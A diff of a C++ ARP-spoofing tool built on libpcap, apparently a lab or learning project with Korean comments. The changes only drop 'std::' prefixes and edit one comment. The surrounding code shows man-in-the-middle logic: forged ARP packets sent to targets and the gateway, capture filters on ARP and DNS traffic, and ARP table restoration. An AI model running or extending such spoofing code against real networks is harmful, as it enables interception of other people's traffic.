@@ -27,7 +27,7 @@ void spoofing_thread_func(SpoofTarget* t) {
 
 // SpoofTarget 구현
 
-SpoofTarget::SpoofTarget(const std::string& ip_str_) : ip_str(ip_str_), running(false) 
+SpoofTarget::SpoofTarget(const string& ip_str_) : ip_str(ip_str_), running(false) 
 {
     string_to_ip(ip_str_.c_str(), ip);
     memset(mac, 0, 6);
@@ -50,7 +50,7 @@ const uint8_t* SpoofTarget::get_mac() const {
     return mac;
 }
 
-const std::string& SpoofTarget::get_ip_str() const {
+const string& SpoofTarget::get_ip_str() const {
     return ip_str;
 }
 
@@ -65,7 +65,7 @@ void SpoofTarget::set_mac(const uint8_t* mac_) {
 void SpoofTarget::start_thread(void (*threadFunc)(SpoofTarget*), SpoofTarget* target) {
     if (!running) {
         running = true;
-        thread_ptr = std::make_unique<std::thread>(threadFunc, target);
+        thread_ptr = make_unique<thread>(threadFunc, target);
     }
 }
 
@@ -78,7 +78,7 @@ void SpoofTarget::stop_thread() {
 
 // ArpSpoofer 구현
 
-ArpSpoofer::ArpSpoofer(const std::string& iface) : interface(iface), handle(nullptr) 
+ArpSpoofer::ArpSpoofer(const string& iface) : interface(iface), handle(nullptr) 
 {
     memset(errbuf, 0, PCAP_ERRBUF_SIZE);
     memset(attacker_mac, 0, 6);
@@ -96,7 +96,7 @@ ArpSpoofer::~ArpSpoofer()
 
 bool ArpSpoofer::initialize() 
 {
-    // 타임아웃을 100ms로 단축하여 빠른 패킷 캡처
+    // 타임아웃을 100ms로 빠른 패킷 캡처
     handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 100, errbuf);
     if (handle == nullptr) 
     {
@@ -122,7 +122,7 @@ bool ArpSpoofer::initialize()
     return true;
 }
 
-bool ArpSpoofer::set_gateway(const std::string& gateway_ip_str_) {
+bool ArpSpoofer::set_gateway(const string& gateway_ip_str_) {
     gateway_ip_str = gateway_ip_str_;
     string_to_ip(gateway_ip_str.c_str(), gateway_ip);
     
@@ -138,8 +138,8 @@ bool ArpSpoofer::set_gateway(const std::string& gateway_ip_str_) {
     return true;
 }
 
-bool ArpSpoofer::add_target(const std::string& target_ip_str) {
-    auto target = std::make_unique<SpoofTarget>(target_ip_str);
+bool ArpSpoofer::add_target(const string& target_ip_str) {
+    auto target = make_unique<SpoofTarget>(target_ip_str);
     uint8_t target_mac[6];
     if (!get_mac_from_ip(target->get_ip(), target_mac)) {
         cerr << "Failed to get target MAC: " << target_ip_str << "\n";
@@ -148,16 +148,16 @@ bool ArpSpoofer::add_target(const std::string& target_ip_str) {
     target->set_mac(target_mac);
     cout << "Added spoof target - IP: " << target_ip_str 
          << ", MAC: " << mac_to_string(target_mac) << "\n";
-    std::lock_guard<std::mutex> lock(mutex);
-    targets.push_back(std::move(target));
+    lock_guard<std::mutex> lock(mutex);
+    targets.push_back(move(target));
     return true;
 }
 
 
 bool ArpSpoofer::update_filter() {
-    std::string filter_exp = "((arp or (ip and udp port 53)) and (host " + ip_to_string(gateway_ip);
+    string filter_exp = "((arp or (ip and udp port 53)) and (host " + ip_to_string(gateway_ip);
     {
-        std::lock_guard<std::mutex> lock(mutex);
+        lock_guard<std::mutex> lock(mutex);
         for (const auto& target : targets)
             filter_exp += " or host " + target->get_ip_str();
     }
@@ -199,7 +199,7 @@ void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target)
 
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
     {
-        std::cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
+        cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
     }
 
     // 게이트웨이에 대한 ARP 스푸핑 패킷도 전송
@@ -207,7 +207,7 @@ void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target)
 
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
     {
-        std::cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
+        cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
     }
 }
 
@@ -216,7 +216,7 @@ void ArpSpoofer::start_spoofing_all()
 {
     global_instance = this;
     
-    std::lock_guard<std::mutex> lock(mutex);
+    lock_guard<std::mutex> lock(mutex);
     for (auto& target : targets) 
     {
         if (!target->is_running())
@@ -227,7 +227,7 @@ void ArpSpoofer::start_spoofing_all()
 void ArpSpoofer::send_recover_arp_packets() 
 {
     cout << "Restoring ARP tables...\n";
-    std::lock_guard<std::mutex> lock(mutex);
+    lock_guard<std::mutex> lock(mutex);
 
     for (auto& target : targets) 
     {
@@ -264,7 +264,7 @@ void ArpSpoofer::stop_all()
 {
     cout << "Stopping all spoofing...\n";
     send_recover_arp_packets();
-    std::lock_guard<std::mutex> lock(mutex);
+    lock_guard<std::mutex> lock(mutex);
     for (auto& target : targets)
     {
         target->stop_thread();
